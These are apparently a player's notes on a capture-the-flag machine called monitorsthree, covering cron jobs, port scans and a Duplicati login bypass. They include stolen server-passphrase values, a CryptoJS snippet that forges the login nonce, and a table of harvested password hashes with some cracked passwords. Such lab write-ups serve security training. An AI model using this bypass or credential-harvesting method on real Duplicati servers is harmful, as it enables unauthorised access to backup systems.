User: marcus
Passord: 12345678910
### START

From here the first thing i noticed was the following contents in the folder /opt

```bash
marcus@monitorsthree:~$ ls /opt
backups  containerd  docker-compose.yml  duplicati
```

So we have a duplicati instance running inside a docker container. This is probably the following step towards root.  

### CRONJOBS

```bash
-rw-r--r--   1 root root   67 May 18 21:47 cacti
-rw-r--r--   1 root root   46 May 20 17:30 cleanup_cacti
-rw-r--r--   1 root root   47 May 21 16:24 cleanup_cron
-rw-r--r--   1 root root   69 Aug 18 10:18 duplicati

$ cat /etc/cron.d/cleanup_cacti 
* * * * * root /root/scripts/cleanup_cacti.sh

$ cat /etc/cron.d/cacti 
*/5 * * * * apache2 php /var/www/html/cacti/poller.php &>/dev/null

$ cat /etc/cron.d/cleanup_cron 
*/5 * * * * root /root/scripts/cleanup_cron.sh

$ cat /etc/cron.d/duplicati 
*/10 * * * * root cd ~/scripts/duplicati-client && python3 client.py

```

### KNOWN VULNS 

In this case if found the following:

- https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee
- https://github.com/duplicati/duplicati/issues/5197

So i got the passphrases from the server:

```bash
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
```

I had a bit of trouble exploiting this, so i explored other options in the mean time, however, in the end it ended up working.

```js
var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('AB4CGYH0GoXgmMgRA2uCZgr6SjKzSLDP1GXFPMf64rk=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64); // The first one is the nonce and the second one is the hex of the server-passphrase
```

Now we are inside of [[duplicati]].

**Nothing in exploit db/searchsploit**
**Nothing found in nist/nvd**

### GATHERING PASSWORDS

| **username**      | **hash**                                                       | **password**   |
| ----------------- | -------------------------------------------------------------- | -------------- |
| marcus@cacti      | `$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK` | 12345678910    |
| admin@cacti       | `$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G` |                |
| guest@cacti       | `$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu` | guest          |
| dthompson@web     | `c585d01f2eb3e6e1073e92023088a3dd`                             |                |
| janderson@web     | `1e68b6eb86b45f6d92f8f292428f77ac`                             |                |
| mwatson@web       | `633b683cc128fe244b00f176c8a950f5`                             |                |
| admin@web         | `31a181c8372e3afc59dab863430610e8`                             | greencacti2001 |
| cactiuser@mariadb | ...                                                            | cactiuser      |

### GENERIC INFORMATION

As for ports listening in this computer:

```bash
marcus@monitorsthree:/opt/backups/cacti$ ss -tuln
Netid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process    
udp      UNCONN    0         0              127.0.0.53%lo:53                 0.0.0.0:*                  
udp      UNCONN    0         0                    0.0.0.0:68                 0.0.0.0:*                  
tcp      LISTEN    0         4096               127.0.0.1:38983              0.0.0.0:*                  
tcp      LISTEN    0         4096               127.0.0.1:8200               0.0.0.0:*                  
tcp      LISTEN    0         128                  0.0.0.0:22                 0.0.0.0:*                  
tcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*                  
tcp      LISTEN    0         70                 127.0.0.1:3306               0.0.0.0:*                  
tcp      LISTEN    0         500                  0.0.0.0:8084               0.0.0.0:*                  
tcp      LISTEN    0         4096           127.0.0.53%lo:53                 0.0.0.0:*                  
tcp      LISTEN    0         128                     [::]:22                    [::]:*                  
tcp      LISTEN    0         511                     [::]:80                    [::]:*    
```

- PORT 38983: http server, that returns not found.

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-13 11:01 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000079s latency).

PORT     STATE SERVICE   VERSION
8200/tcp open  trivnet1?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Fri, 13 Sep 2024 09:02:30 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Date: Fri, 13 Sep 2024 09:02:03 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8200-TCP:V=7.80%I=7%D=9/13%Time=66E3FF6D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\
SF:x20Fri,\x2013\x20Sep\x202024\x2009:02:03\x20GMT\r\nContent-Length:\x201
SF:9\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20Page\
SF:x20Not\x20Found")%r(HTTPOptions,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nDate:\x20Fri,\x2013\x20Sep\x202024\x2009:02:03\x20GMT\r\nContent-Lengt
SF:h:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x
SF:20Page\x20Not\x20Found")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Term
SF:inalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,8F,"
SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Fri,\x2013\x20Sep\x202024\
SF:x2009:02:30\x20GMT\r\nContent-Length:\x2019\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\n\r\n404:\x20Page\x20Not\x20Found")%r(LPDString
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request");

```

- PORT 8200: The duplicati login page

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-13 11:10 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000083s latency).

PORT     STATE SERVICE VERSION
8200/tcp open  http    Duplicati httpserver
|_http-server-header: Tiny WebServer
| http-title: Duplicati Login
|_Requested resource was /login.html

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds

```

- PORT 3306: A mariadb instance

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-13 11:12 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000083s latency).

PORT     STATE SERVICE VERSION
8200/tcp open  mysql   MySQL 5.5.5-10.6.18-MariaDB-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.6.18-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 3643
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, FoundRows, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, ODBCClient, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: w0&lpkLv0*"kt(dB\+]u
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

- PORT 8084: ???

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-13 11:14 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000081s latency).

PORT     STATE SERVICE   VERSION
8200/tcp open  trivnet1?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.47 seconds
```

